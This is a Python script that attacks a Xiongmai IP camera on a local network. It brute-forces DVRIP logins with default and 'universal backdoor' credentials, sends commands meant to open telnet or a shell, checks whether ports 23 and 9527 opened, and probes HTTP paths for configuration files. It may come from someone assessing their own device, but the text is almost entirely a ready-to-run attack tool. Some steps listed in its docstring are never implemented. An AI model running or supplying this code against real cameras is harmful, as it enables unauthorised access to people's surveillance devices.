"""
Try known Xiongmai backdoor techniques:
1. Login with the universal backdoor password "I0TO5Wv9" via DVRIP
2. Try to enable telnet via DVRIP command
3. Try the 9530 OpenTelnet protocol (even though port appears closed)
4. Try debug console strings on various ports
5. Try HTTP paths that might reveal firmware info
"""
import socket
import json
import struct
import hashlib

CAMERA_IP = "192.168.1.153"


def xm_hash(password):
    m = hashlib.md5(password.encode()).digest()
    s = ""
    for i in range(8):
        n = (m[2 * i] + m[2 * i + 1]) % 62
        if n > 35:
            s += chr(n + 61)
        elif n > 9:
            s += chr(n + 55)
        else:
            s += chr(n + 48)
    return s


def dvrip_login(ip, port, username, password, login_type="DVRIP-Web"):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((ip, port))
        pw_hash = xm_hash(password)
        data = json.dumps({
            "EncryptType": "MD5",
            "LoginType": login_type,
            "PassWord": pw_hash,
            "UserName": username,
        }).encode("utf-8") + b"\x0a\x00"

        header = struct.pack("<BBBBIIBBHI", 0xFF, 0x01, 0x00, 0x00, 0, 0, 0, 0, 1000, len(data))
        sock.send(header + data)

        resp_hdr = b""
        while len(resp_hdr) < 20:
            chunk = sock.recv(20 - len(resp_hdr))
            if not chunk:
                break
            resp_hdr += chunk

        if len(resp_hdr) >= 20:
            _, _, _, _, sid, _, _, _, mid, dlen = struct.unpack("<BBBBIIBBHI", resp_hdr)
            body = b""
            while len(body) < dlen:
                chunk = sock.recv(dlen - len(body))
                if not chunk:
                    break
                body += chunk

            if len(body) >= 24:
                fields = struct.unpack("<IIIIII", body[:24])
                return sid, fields
            return sid, body.hex()
        return None, None
    except Exception as e:
        return None, str(e)
    finally:
        sock.close()


def try_http_paths(ip):
    """Try known XMeye HTTP paths."""
    paths = [
        "/",
        "/index.html",
        "/login.html",
        "/web/",
        "/doc/page/login.asp",
        "/snap.jpg",
        "/snapshot.jpg",
        "/cgi-bin/snapshot.cgi",
        "/onvif/device_service",
        "/system.ini",
        "/Config/",
        "/DVR.htm",
        # Common XMeye paths
        "/web/cgi-bin/hi3510/param.cgi?cmd=getserverinfo",
        "/web/cgi-bin/hi3510/param.cgi?cmd=getdevicecfg",
        "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo",
    ]

    for path in paths:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, 80))
            req = f"GET {path} HTTP/1.0\r\nHost: {ip}\r\n\r\n"
            s.send(req.encode())
            resp = b""
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                except:
                    break
            s.close()

            if resp:
                first_line = resp.split(b"\r\n")[0].decode("utf-8", errors="replace")
                content_len = len(resp)
                # Check for non-error responses
                if b"200" in resp[:50] or b"401" in resp[:50] or content_len > 200:
                    # Get content type
                    ct = ""
                    for line in resp.split(b"\r\n"):
                        if b"Content-Type" in line:
                            ct = line.decode("utf-8", errors="replace")
                            break
                    body_start = resp.find(b"\r\n\r\n")
                    body = resp[body_start + 4:] if body_start >= 0 else b""
                    print(f"  {path:55s} -> {first_line} ({len(body)} bytes body) {ct}")
                    if body and len(body) < 500 and b"<" not in body[:10]:
                        print(f"    Content: {body[:200].decode('utf-8', errors='replace')}")
        except Exception as e:
            pass


def main():
    # Test 1: Login with various credentials
    print("=== DVRIP Login attempts ===")
    creds = [
        ("admin", ""),
        ("admin", "admin"),
        ("admin", "I0TO5Wv9"),  # Universal backdoor
        ("admin", "12345"),
        ("admin", "123456"),
        ("default", ""),
        ("default", "tluafed"),
        ("user", ""),
    ]

    for user, pw in creds:
        sid, fields = dvrip_login(CAMERA_IP, 34567, user, pw)
        status = "OK" if sid else "FAIL"
        print(f"  {user:12s} / {pw:15s} -> {status}  session=0x{sid:08x}" if sid else f"  {user:12s} / {pw:15s} -> {status}")
        if isinstance(fields, tuple):
            print(f"    ret={fields[0]} status={fields[2]} type={fields[3]}")

    # Test 2: Try to send telnet-enable command via DVRIP
    print("\n=== Try enabling telnet via DVRIP ===")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((CAMERA_IP, 34567))

    # Login first
    pw_hash = xm_hash("")
    login_data = json.dumps({
        "EncryptType": "MD5",
        "LoginType": "DVRIP-Web",
        "PassWord": pw_hash,
        "UserName": "admin",
    }).encode("utf-8") + b"\x0a\x00"
    header = struct.pack("<BBBBIIBBHI", 0xFF, 0x01, 0x00, 0x00, 0, 0, 0, 0, 1000, len(login_data))
    sock.send(header + login_data)
    resp = sock.recv(4096)
    _, _, _, _, sid = struct.unpack("<BBBBIBBHI", resp[:15])[:5]

    # Try TelnetOpen command
    telnet_cmds = [
        (1452, {"Name": "OPMachine", "OPMachine": {"Action": "Telnet", "Enable": True}}),
        (1452, {"Name": "OPMachine", "OPMachine": {"Action": "ShellOpen"}}),
        (1460, {"Name": "OPSysOperation", "OPSysOperation": {"Action": "TelnetOpen"}}),
    ]

    for seq, (msgid, payload) in enumerate(telnet_cmds, 1):
        data = json.dumps(payload).encode("utf-8") + b"\x0a\x00"
        hdr = struct.pack("<BBBBIIBBHI", 0xFF, 0x01, 0x00, 0x00, sid, seq, 0, 0, msgid, len(data))
        sock.send(hdr + data)
        try:
            resp = sock.recv(4096)
            print(f"  {payload['OPMachine' if 'OPMachine' in payload else 'OPSysOperation']}: {len(resp)} bytes response")
        except:
            print(f"  {payload}: no response")

    sock.close()

    # Check if telnet opened
    import time
    time.sleep(2)
    for port in [23, 9527]:
        try:
            t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            t.settimeout(2)
            t.connect((CAMERA_IP, port))
            print(f"  Port {port} is now OPEN!")
            # Try to read banner
            try:
                banner = t.recv(1024)
                print(f"  Banner: {banner.decode('utf-8', errors='replace')}")
            except:
                pass
            t.close()
        except:
            print(f"  Port {port} still closed")

    # Test 3: HTTP paths
    print("\n=== HTTP path probing ===")
    try_http_paths(CAMERA_IP)


if __name__ == "__main__":
    main()
